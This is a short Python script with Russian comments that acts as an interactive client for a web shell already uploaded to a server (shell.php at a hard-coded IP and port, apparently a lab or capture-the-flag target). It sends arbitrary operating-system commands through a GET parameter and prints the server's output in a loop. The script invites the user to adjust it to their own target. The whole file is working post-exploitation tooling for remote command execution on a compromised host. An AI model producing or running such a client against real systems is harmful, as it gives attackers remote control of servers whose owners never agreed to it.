import requests
import sys
import readline  # для удобной истории команд в терминале

# Настройки — измени под свою ситуацию
URL = "http://94.237.58.137:57791/shell.php"          # ← твой URL с загруженной оболочкой
PARAM = "cmd"                                         # ← имя GET-параметра (cmd, c, command и т.д.)
PROMPT = "shell> "                                    # ← как будет выглядеть приглашение

def send_command(cmd):
    try:
        r = requests.get(URL, params={PARAM: cmd}, timeout=15)
        if r.status_code != 200:
            print(f"[!] HTTP {r.status_code}")
            return None
        return r.text.strip()
    except requests.RequestException as e:
        print(f"[!] Ошибка соединения: {e}")
        return None

print("[+] Полуинтерактивная веб-оболочка")
print(f"    URL   : {URL}")
print(f"    Параметр : ?{PARAM}=<команда>")
print("    exit / quit / Ctrl+C — выход\n")

while True:
    try:
        cmd = input(PROMPT).strip()
        if cmd.lower() in ("exit", "quit", ""):
            print("[+] Завершение")
            break

        if not cmd:
            continue

        output = send_command(cmd)
        if output is not None:
            print(output)

    except KeyboardInterrupt:
        print("\n[+] Ctrl+C → выход")
        sys.exit(0)